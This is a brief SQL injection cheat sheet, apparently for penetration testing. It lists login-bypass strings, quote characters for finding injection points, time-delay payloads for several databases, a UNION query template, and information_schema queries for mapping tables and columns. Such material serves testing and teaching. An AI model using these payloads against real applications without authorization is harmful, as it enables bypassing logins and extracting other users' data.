# SQL Injection

>An SQL injection is a security flaw that allows attackers to interfere with database queries of an application. This vulnerability can enable attackers to view, modify, or delete data they shouldn't access, including information of other users or any data the application can access. Such actions may result in permanent changes to the application's functionality or content or even compromision of the server or denial of service.

### MYSQL Conditional Statement
```sql
IF(condition,true-part,false-part) (M) 
SELECT IF(1=1,'true','false')
```

### Login Bypass payloads

This is SQL injection 101—here are some typical login tricks that you can use with form fields and parameters:

```sql
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```
### Entry point detection
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
### Confirming with timing
```sql
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```


## Union Based Attacks
 When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

 ```sql
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

## Finding Database structure in mysql

### Finding table name
```sql
SELECT table_name FROM information_schema.tables WHERE table_schema = 'databasename'
```
### Finding column name
```sql
SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'tablename'
```


# References
- [Port Swigger Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [Invicti](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#LineCommentAttacks)
- 
